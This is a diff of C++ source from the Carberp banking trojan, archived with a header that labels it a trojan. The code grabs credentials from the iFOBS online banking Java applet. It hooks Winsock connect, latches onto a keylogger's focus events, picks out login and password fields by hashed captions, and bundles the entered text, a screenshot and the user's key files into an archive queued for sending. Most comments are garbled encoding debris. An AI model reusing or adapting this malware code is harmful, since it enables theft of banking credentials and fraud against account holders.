@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -26,36 +37,36 @@ namespace IFOBSONLINEEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define IFODBG IFOBSONLINEEBUGSTRINGS::DBGOutMessage<>
 
 
 HWND SearchJavaAppletWindow();
 
 
-const static DWORD IFOLoginHashes[] = {0xBDD8F46C /* логин */,
-									   0xBDD8D9EC /* логін */,
+const static DWORD IFOLoginHashes[] = {0xBDD8F46C /* пїЅпїЅпїЅпїЅпїЅ */,
+									   0xBDD8D9EC /* пїЅпїЅпїЅпїЅ */,
 									   0xCDF9F4E8 /* login */,
 									   0};
 
-const static DWORD IFOPasswordHashes[] = {0xF1E44A82 /* пароль */,
+const static DWORD IFOPasswordHashes[] = {0xF1E44A82 /* пїЅпїЅпїЅпїЅпїЅпїЅ */,
 										  0x3E1A7EFB /* password */,
 										  0};
 
 
 //==========================================================
-//        Глобальные данные грабера
+//        пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 namespace IfobsOnline
 {
-	DWORD PID = 0;        // Пид процесса, в котором работает грабер
-	DWORD EventID = 0;    // Ид события смены фокуса
+	DWORD PID = 0;        // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD EventID = 0;    // пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HWND  FrameWnd = 0;
 	TIfobsOnlineGrabber *Grabber = NULL;
 
-	HWND  AppletWnd = 0;  // Идентификатор окна аплета
+	HWND  AppletWnd = 0;  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Определяем типы для установки хуков
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);
 
 
@@ -63,7 +74,7 @@ namespace IfobsOnline
 
 
 
-	// Функция обработки сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int WINAPI Hook_Connect(SOCKET s, const struct sockaddr *name, int namelen )
 	{
 		if (Grabber)
@@ -80,26 +91,26 @@ namespace IfobsOnline
 
 	void WINAPI FocusChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	{
-		// Создаём новый грабер
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
         if (Grabber) return;
 
 		Grabber = new TIfobsOnlineGrabber(FrameWnd); 
 
 		if (!Grabber->IsIfobs())
 		{
-			// Окно не является окном ИФобс
+			// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			delete Grabber;
 			Grabber = NULL;
 			return;
 		}
 
-		IFODBG("IfobsOnline", "Стартуем IfobOnline ");
+		IFODBG("IfobsOnline", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IfobOnline ");
 
 
-		// Проверяем на предмет уже установленных хуков
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (!Real_Connect)
 		{
-			// Устанавливаем хуки
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if ( HookApi( DLL_WINSOCK, 0xEDD8FE8A /* connect */, &Hook_Connect ) )
 			{
 				__asm mov [Real_Connect], eax
@@ -110,11 +121,11 @@ namespace IfobsOnline
 
 
 	//*****************************************************
-	//  Initialize - Функия инициализирует грабер
+	//  Initialize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	//*****************************************************
 	bool Initialize(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWnd)
 	{
-		// проверяем текущий процесс
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (ClassWndHash != JAVAWND_SUNAWTFRAME || !IsChildWnd) return false;
 
 		if (IsNewProcess(PID))
@@ -126,7 +137,7 @@ namespace IfobsOnline
 		}
 
 
-		// Закрываем старый грабер
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Grabber)
 		{
 			delete Grabber;
@@ -135,7 +146,7 @@ namespace IfobsOnline
 
 		if (EventID == 0)
 		{
-			// Подключаем событие на смену фокуса
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
             EventID = KeyLogger::ConnectEventHandler(KLE_FOCUS_CHANGED, FocusChanged);
 		}
 
@@ -151,13 +162,13 @@ namespace IfobsOnline
 
 
 //******************************************************
-//  Класс идентификации Ифобс банка по схеме окон
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //******************************************************
 
 
 int CALLBACK TIfobsOnlineGrabberEnumWnd(HWND Wnd, LPARAM Param)
 {
-	// Обрабатываем окно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     ((TIfobsOnlineGrabber*)Param)->CheckWindow(Wnd);
 	pEnumChildWindows(Wnd, TIfobsOnlineGrabberEnumWnd, Param);
 	return TRUE;
@@ -186,17 +197,17 @@ void TIfobsOnlineGrabber::InsertWnd(HWND Wnd, TBotList &L)
 //-----------------------------------------------------------------------------
 
 //---------------------------------------------------
-//  Добавляем окно в схему
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 void TIfobsOnlineGrabber::CheckWindow(HWND Wnd)
 {
-	// Проверяем редактор ввода
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (IsJavaEditWindow(Wnd))
 		InsertWnd(Wnd, FEdits);
 	else
 	if (IsJavaLabelWindow(Wnd))
 	{
-		// Привязываемся к некоторым надписям окна
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (SameWndTextWithHashArray(Wnd, &IFOLoginHashes[0], true))
 			Captions |= 1;
 		else
@@ -207,7 +218,7 @@ void TIfobsOnlineGrabber::CheckWindow(HWND Wnd)
 }
 
 //---------------------------------------------------
-//  Функция возвращает окно по его идентификатору
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 HWND TIfobsOnlineGrabber::GetEditByID(LONG ID)
 {
@@ -222,17 +233,17 @@ HWND TIfobsOnlineGrabber::GetEditByID(LONG ID)
 
 
 //---------------------------------------------------
-// Функция проверяет схему
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 bool TIfobsOnlineGrabber::CheckScheme()
 {
 
-	// Функция вернёт истину если во фрейме 4 едита
-	// две кнопки с нужными надписями
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 4 пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (FEdits.Count() != 4)
 		return false;
 
-	// Проверяем все найденные надписи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Captions != 3) return false;
 
 
@@ -244,7 +255,7 @@ bool TIfobsOnlineGrabber::CheckScheme()
 }
 
 //---------------------------------------------------
-// Функция упаковывает текстовые данные
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 string TIfobsOnlineGrabber::PackTextData()
 {
@@ -272,16 +283,16 @@ string TIfobsOnlineGrabber::PackTextData()
 
 
 //-----------------------------------------------------
-//  AddFilewsToCab - Функия добавляет папку ключей в
-//                   архив
+//  AddFilewsToCab - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+//                   пїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------------
 void TIfobsOnlineGrabber::AddFilesToCab(LPVOID Cab)
 {
 	if (!DirExists(FKeyFilePath.t_str())) return;
 
-	IFODBG("IfobsOnline", "Добавляем ключи в архив: %s", FKeyFilePath.t_str());
+	IFODBG("IfobsOnline", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ: %s", FKeyFilePath.t_str());
 
-	// Проверяем максимальный размер папки с ключами
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (SizeFolderLess(FKeyFilePath.t_str(), IFOBS_MAX_KEY_PATH_SIZE, NULL))
 		AddDirToCab(Cab, FKeyFilePath.t_str(), GetStr(EStrLogKeyPath).t_str());
 }
@@ -289,7 +300,7 @@ void TIfobsOnlineGrabber::AddFilesToCab(LPVOID Cab)
 
 
 //-----------------------------------------------------
-//  SendLog - Функия собирает лог
+//  SendLog - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //-----------------------------------------------------
 BOOL TIfobsOnlineGrabber::SendLog()
 {
@@ -298,7 +309,7 @@ BOOL TIfobsOnlineGrabber::SendLog()
 	string Log = PackTextData();
 	if (Log.IsEmpty()) return FALSE;
 
-    IFODBG("IfobsOnline", "Получен лог IFobsOnline: \r\n%s", Log.t_str());
+    IFODBG("IfobsOnline", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IFobsOnline: \r\n%s", Log.t_str());
 
 	BOOL Result = FALSE;
 
@@ -306,23 +317,23 @@ BOOL TIfobsOnlineGrabber::SendLog()
 	HCAB Cab = CreateCab(CABName.t_str());
 	if (Cab)
 	{
-		// Упаковываем логин и пароли
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		AddStringToCab(Cab, Log, GetStr(StrLogFileTextData));
 
-		// Добавляем скриншот
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		string Screen = File::GetTempName2A();
 		bool AddScreen = ScreenShot::Make(GetTopParentWindow(FSunAwtFrameWnd), 0, 0, 0, 0, NULL, Screen.t_str());
 		if (AddScreen)
 			AddFileToCab(Cab, Screen.t_str(), GetStr(StrLogFileScreenShot));
 		pDeleteFileA(Screen.t_str());
 
-		// Добавляем ключи
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		AddFilesToCab(Cab);
 
-		// Закрываем арив
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		CloseCab(Cab);
 
-		// Отправляем лог
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		DataGrabber::SendCabDelayed(NULL, CABName.t_str(), GetStr(EStrSystemIfobsOnline).t_str());
 
 		Result = TRUE;
